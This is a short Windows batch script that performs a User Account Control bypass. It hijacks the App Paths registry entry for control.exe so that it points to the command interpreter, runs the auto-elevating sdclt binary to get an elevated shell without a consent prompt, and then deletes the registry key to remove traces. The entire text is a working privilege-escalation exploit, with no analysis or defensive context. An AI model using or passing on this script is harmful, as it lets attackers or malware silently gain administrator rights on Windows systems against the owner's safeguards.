@echo off

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d %COMSPEC% /f
sdclt
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f

